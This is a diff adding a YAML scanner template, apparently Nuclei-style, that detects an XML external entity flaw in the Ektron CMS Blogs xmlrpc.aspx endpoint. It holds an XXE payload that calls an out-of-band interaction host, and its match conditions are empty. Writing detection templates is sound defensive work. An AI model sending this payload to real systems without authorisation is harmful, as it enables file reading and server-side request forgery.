@@ -1,0 +1,23 @@
+id: ektron-blog-xmlrpc-xxe
+brief:
+    title: Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection
+    by: pussycat0x
+    level: high
+    about: Detects XML External Entity (XXE) vulnerability in Ektron CMS Blogs component (/WorkArea/Blogs/xmlrpc.aspx). Allows unauthenticated attackers to read local files or perform SSRF.
+    label:
+        - xxe
+        - ektron
+        - cms
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/WorkArea/Blogs/xmlrpc.aspx'
+      body: |-
+        <!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>
+        <scan>&test;</scan>
+      signs: []
